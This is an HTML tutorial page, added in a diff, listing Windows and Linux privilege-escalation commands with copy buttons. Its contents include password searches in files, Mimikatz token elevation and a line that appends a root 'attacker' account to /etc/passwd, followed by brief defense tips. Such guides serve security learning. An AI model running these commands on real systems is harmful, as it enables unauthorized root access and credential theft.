@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Privilege Escalation Guide</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+      color: #333;
+      margin: 20px;
+      line-height: 1.6;
+    }
+    h1, h2, h3 {
+      color: #0056b3;
+    }
+    pre {
+      background: #eeeeee;
+      padding: 10px;
+      border-radius: 8px;
+      position: relative;
+      overflow-x: auto;
+    }
+    .copy-btn {
+      position: absolute;
+      top: 8px;
+      right: 8px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 5px 10px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 12px;
+    }
+    .copy-btn:hover {
+      background-color: #0056b3;
+    }
+    ul {
+      margin-right: 20px;
+    }
+    a {
+      color: #007bff;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+<h1>Privilege Escalation Guide</h1>
+
+<h2>What is Privilege Escalation?</h2>
+<p>Privilege Escalation is the process where a user gains higher-level permissions, usually to perform actions reserved for admins or SYSTEM.</p>
+
+<h2>Types of Privilege Escalation</h2>
+<ul>
+  <li><strong>Vertical Escalation</strong> – From normal user to admin.</li>
+  <li><strong>Horizontal Escalation</strong> – Accessing resources of another user without higher privileges.</li>
+</ul>
+
+<h2>Privilege Escalation on Windows</h2>
+
+<h3>1. Checking Current Privileges</h3>
+<p>See what privileges your user has:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>whoami /priv</pre>
+
+<h3>2. Finding Misconfigured Services</h3>
+<p>List automatically starting services, often vulnerable:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>wmic service get name,displayname,pathname,startmode | findstr /i "Auto"</pre>
+
+<h3>3. Unquoted Service Paths</h3>
+<p>Check if a service path isn't quoted (can exploit by placing your executable):</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>sc qc ServiceName</pre>
+
+<h3>4. Scheduled Tasks with Weak Permissions</h3>
+<p>Find scheduled tasks where you might have write access:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>schtasks /query /fo LIST /v</pre>
+
+<h3>5. Checking File and Folder Permissions</h3>
+<p>Look for files/folders with weak ACLs (you can edit):</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>icacls C:\Path\To\FileOrFolder</pre>
+
+<h3>6. Using PowerUp to Automate Checks</h3>
+<p>PowerShell module to find misconfigurations automatically:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>Import-Module .\PowerUp.ps1
+Invoke-AllChecks</pre>
+
+<h3>7. Searching for Plaintext Passwords</h3>
+<p>Search for passwords inside common file types:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>findstr /si password *.txt *.ini *.xml</pre>
+
+<h3>8. Token Manipulation using Mimikatz</h3>
+<p>Steal another user's token and impersonate:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>mimikatz
+privilege::debug
+token::elevate</pre>
+
+<h2>Privilege Escalation on Linux</h2>
+
+<h3>1. Checking Sudo Rights</h3>
+<p>See what commands you can run with sudo without password:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>sudo -l</pre>
+
+<h3>2. Finding SUID Binaries</h3>
+<p>SUID files run as the file owner (often root):</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>find / -perm -4000 2>/dev/null</pre>
+
+<h3>3. Writable /etc/passwd Trick</h3>
+<p>If you can write to /etc/passwd, add a root user manually:</p>
+<pre><button class="copy-btn" onclick="copyText(this)">Copy</button>echo 'attacker:$1$xyz$...:0:0:root:/root:/bin/bash' >> /etc/passwd</pre>
+
+<h2>Defense Tips</h2>
+<ul>
+  <li>Apply security patches regularly</li>
+  <li>Fix misconfigured services and permissions</li>
+  <li>Monitor privilege changes</li>
+  <li>Never store passwords in plaintext files</li>
+</ul>
+
+<h2>Summary</h2>
+<p>Privilege escalation is key both for attackers and defenders. Understanding and fixing vulnerabilities helps to protect systems properly.</p>
+
+<p><a href="index.html">← Back to Home</a></p>
+
+<script>
+function copyText(button) {
+  const code = button.nextSibling.textContent;
+  navigator.clipboard.writeText(code.trim());
+  button.innerText = "Copied!";
+  setTimeout(() => button.innerText = "Copy", 2000);
+}
+</script>
+
+</body>
+</html>
